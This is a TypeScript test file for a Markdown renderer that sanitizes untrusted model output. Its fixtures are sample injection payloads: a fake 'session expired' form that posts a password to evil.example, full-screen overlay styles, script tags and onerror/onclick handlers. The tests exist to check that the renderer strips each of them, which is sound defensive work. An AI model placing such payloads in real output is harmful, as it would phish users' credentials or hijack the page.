import { describe, expect, it } from 'vitest';

import { renderDocument, renderMarkdown, WORKSPACE_PICTURE } from './renderMarkdown';

type Render = (text: string) => string;

/** The rendered HTML as the screen would hold it, to query like a page. */
function host(html: string): HTMLElement {
  const element = document.createElement('div');
  element.innerHTML = html;
  return element;
}

const rendered = (text: string) => host(renderMarkdown(text));
const asDocument = (text: string, base = 3) => host(renderDocument(text, base));

describe('renderMarkdown', () => {
  it('renders Markdown to HTML', () => {
    expect(renderMarkdown('**bold**')).toContain('<strong>bold</strong>');
  });

  it('strips script tags from untrusted model output', () => {
    const html = renderMarkdown('hello <script>alert(1)</script>');
    expect(html).not.toContain('<script>');
    expect(html).toContain('hello');
  });

  it('renders exactly as before renderDocument existed, so chat is unaffected', () => {
    const sample =
      '# Launch plan\n\nSome **bold**, _em_ and a [link](https://example.com).\n\n## Costs\n\n' +
      '| City | Price |\n|:--|--:|\n| Paris | 1,900 |\n\n- one\n  - nested\n\n' +
      '```js\nconst x = 1 < 2;\n```\n\n> quoted\n\n' +
      '<div class="md-table-scroll" data-level="1">x</div>';

    expect(renderMarkdown(sample)).toBe(
      '<h1>Launch plan</h1>\n<p>Some <strong>bold</strong>, <em>em</em> and a ' +
        '<a href="https://example.com" rel="noopener noreferrer">link</a>.</p>\n<h2>Costs</h2>\n' +
        '<table>\n<thead>\n<tr>\n<th align="left">City</th>\n<th align="right">Price</th>\n' +
        '</tr>\n</thead>\n<tbody><tr>\n<td align="left">Paris</td>\n' +
        '<td align="right">1,900</td>\n</tr>\n</tbody></table>\n<ul>\n<li>one<ul>\n' +
        '<li>nested</li>\n</ul>\n</li>\n</ul>\n<pre><code>const x = 1 &lt; 2;\n</code></pre>\n' +
        '<blockquote>\n<p>quoted</p>\n</blockquote>\n<div data-level="1">x</div>',
    );
  });
});

describe.each<[string, Render]>([
  ['renderMarkdown', renderMarkdown],
  ['renderDocument', (text) => renderDocument(text, 3)],
])('%s against content injected into model output', (_name, render) => {
  const page = (text: string) => host(render(text));

  it('draws no form a reply could use to ask for a password', () => {
    const shown = page(
      'Your session expired.\n\n<form action="https://evil.example/collect">' +
        '<input type="password" name="password" placeholder="Password">' +
        '<button type="submit">Sign in again</button></form>',
    );

    expect(shown.querySelector('form, button')).toBeNull();
    expect(shown.querySelector('input[type="password"], [name], [placeholder]')).toBeNull();
    expect(shown.textContent).toContain('Your session expired.');
  });

  it('turns any other input into a disabled checkbox, so nothing can be typed in', () => {
    const shown = page('<input type="text" value="x" form="mission-composer" autofocus>');

    const input = shown.querySelector('input');
    expect(input?.getAttributeNames().sort()).toEqual(['disabled', 'type']);
    expect(input).toHaveAttribute('type', 'checkbox');
  });

  it('drops the other form controls and dialogs', () => {
    const shown = page(
      '<textarea>t</textarea><select><option>o</option></select><label for="x">l</label>' +
        '<fieldset><legend>g</legend></fieldset><output>v</output><dialog open>d</dialog>',
    );

    expect(
      shown.querySelector('textarea, select, option, label, fieldset, legend, output, dialog'),
    ).toBeNull();
  });

  it('keeps no inline style, so nothing can cover the page', () => {
    const shown = page(
      '<div style="position:fixed;inset:0;z-index:9999">over</div>\n\n' +
        '<a href="https://evil.example" style="position:fixed;inset:0;opacity:0">x</a>',
    );

    expect(shown.querySelector('[style]')).toBeNull();
    expect(shown.textContent).toContain('over');
  });

  it('keeps no class, so the app’s own utility classes cannot be borrowed', () => {
    const shown = page('<div class="fixed inset-0 z-50 bg-slate-950">panel</div>');

    expect(shown.querySelector('[class]')).toBeNull();
  });

  it('drops style sheets with their rules', () => {
    const html = render('text<style>body { display: none }</style>');

    expect(html).not.toContain('<style');
    expect(html).not.toContain('display: none');
  });

  it('draws no SVG, which Markdown never makes', () => {
    const shown = page('<svg width="9999" height="9999"><rect /></svg>');

    expect(shown.querySelector('svg')).toBeNull();
  });

  it('opens a link in the same tab without handing over the window or the address', () => {
    const shown = page(
      '[docs](https://example.com) ' +
        '<a href="https://evil.example" target="_blank" rel="opener">x</a>',
    );

    const links = shown.querySelectorAll('a');
    expect(links).toHaveLength(2);
    for (const link of links) {
      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
      expect(link).not.toHaveAttribute('target');
    }
    expect(links[0]).toHaveAttribute('href', 'https://example.com');
  });
});

describe('renderMarkdown and the pictures agents saved', () => {
  it('moves a workspace path out of src, so the browser fetches nothing broken', () => {
    const image = rendered('![The hero loaf](images/hero.jpg)').querySelector('img');

    expect(image).not.toHaveAttribute('src');
    expect(image).toHaveAttribute(WORKSPACE_PICTURE, 'images/hero.jpg');
    expect(image).toHaveAttribute('alt', 'The hero loaf');
  });

  it('reads the path as the agent wrote it, without "./" or URL escapes', () => {
    const image = rendered('![x](./images/pain%20d%C3%A9pice.jpg)').querySelector('img');

    expect(image).toHaveAttribute(WORKSPACE_PICTURE, 'images/pain dépice.jpg');
  });

  it('keeps the path in a reading document, which drops the model’s own data attributes', () => {
    const image = asDocument('![The hero loaf](images/hero.jpg)').querySelector('img');

    expect(image).not.toHaveAttribute('src');
    expect(image).toHaveAttribute(WORKSPACE_PICTURE, 'images/hero.jpg');
  });

  it.each(['https://example.com/a.png', '/logo.png', 'data:image/png;base64,AAAA'])(
    'leaves any other address in src: %s',
    (src) => {
      const image = rendered(`![x](${src})`).querySelector('img');

      expect(image).toHaveAttribute('src', src);
      expect(image).not.toHaveAttribute(WORKSPACE_PICTURE);
    },
  );
});

describe('renderMarkdown keeps what Markdown makes', () => {
  it('keeps tables with their column alignment', () => {
    const shown = rendered('| a | b | c |\n|:--|:-:|--:|\n| 1 | 2 | 3 |');

    const aligns = [...shown.querySelectorAll('td')].map((cell) => cell.getAttribute('align'));
    expect(aligns).toEqual(['left', 'center', 'right']);
    expect(shown.querySelectorAll('th')).toHaveLength(3);
  });

  it('keeps code blocks with their text', () => {
    const shown = rendered('```js\nconst x = 1 < 2;\n```');

    expect(shown.querySelector('pre > code')?.textContent).toBe('const x = 1 < 2;\n');
  });

  it('keeps lists and task lists, their boxes disabled', () => {
    const shown = rendered('1. one\n2. two\n\n- [ ] todo\n- [x] done');

    expect(shown.querySelectorAll('ol > li')).toHaveLength(2);
    const boxes = shown.querySelectorAll('ul input');
    expect(boxes).toHaveLength(2);
    expect(boxes[0]).toBeDisabled();
    expect(boxes[0]).not.toBeChecked();
    expect(boxes[1]).toBeChecked();
  });
});

describe('renderDocument', () => {
  const levels = (shown: HTMLElement) =>
    [...shown.querySelectorAll('h1, h2, h3, h4, h5, h6')].map(
      (heading) => `${heading.localName}:${heading.getAttribute('data-level')}`,
    );

  it('nests the text’s headings from the base level, keeping their own level', () => {
    expect(levels(asDocument('# A\n\n## B\n\n### C', 3))).toEqual(['h3:1', 'h4:2', 'h5:3']);
    expect(levels(asDocument('# A\n\n## B\n\n### C', 2))).toEqual(['h2:1', 'h3:2', 'h4:3']);
  });

  it('never goes deeper than h6', () => {
    expect(levels(asDocument('## B\n\n### C\n\n#### D\n\n###### F', 5))).toEqual([
      'h6:2',
      'h6:3',
      'h6:4',
      'h6:6',
    ]);
  });

  it('keeps what a heading holds: emphasis and links', () => {
    const heading = asDocument(
      '# A **bold** _plan_ with [docs](https://example.com)',
    ).querySelector('h3');

    expect(heading?.querySelector('strong')).toHaveTextContent('bold');
    expect(heading?.querySelector('em')).toHaveTextContent('plan');
    expect(heading?.querySelector('a')).toHaveAttribute('href', 'https://example.com');
    expect(heading?.querySelector('a')).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('puts each table in its own focusable scroller', () => {
    const shown = asDocument('| a |\n|--|\n| 1 |\n\ntext\n\n| b |\n|--|\n| 2 |');

    const scrollers = shown.querySelectorAll(
      'div.md-table-scroll[role="group"][aria-label="Table"][tabindex="0"]',
    );
    expect(scrollers).toHaveLength(2);
    for (const scroller of scrollers) expect(scroller.firstElementChild?.localName).toBe('table');
  });

  it('marks the cells that hold a number, and only those', () => {
    const shown = asDocument(
      '| City | People | Rating | Change | Price |\n|--|--|--|--|--|\n' +
        '| Paris | 1,900 | 4.6 | -12 % | $1.00 |\n| 2024-01-01 | n/a | 4.6 stars | | about 3 |',
    );

    const marked = [...shown.querySelectorAll('td[data-num]')].map((cell) => cell.textContent);
    expect(marked).toEqual(['1,900', '4.6', '-12 %', '$1.00']);
    expect(shown.querySelectorAll('th[data-num]')).toHaveLength(0);
  });

  it('lets no model claim the scroller’s class or the document’s marks', () => {
    const shown = asDocument(
      '<div class="md-table-scroll" tabindex="0">fake</div>\n\n' +
        '<p data-level="1" data-num="">claimed</p>',
    );

    expect(shown.querySelector('.md-table-scroll')).toBeNull();
    expect(shown.querySelector('[data-level], [data-num]')).toBeNull();
    expect(shown.textContent).toContain('fake');
  });

  it('strips scripts and handlers inside table cells', () => {
    const html = renderDocument(
      '<table><tr><td onclick="alert(1)">1<script>alert(2)</script></td>' +
        '<td><img src="x" onerror="alert(3)"></td></tr></table>',
      3,
    );

    expect(html).not.toMatch(/<script|onclick|onerror|alert/);
    expect(host(html).querySelector('.md-table-scroll td')).toHaveTextContent('1');
  });
});
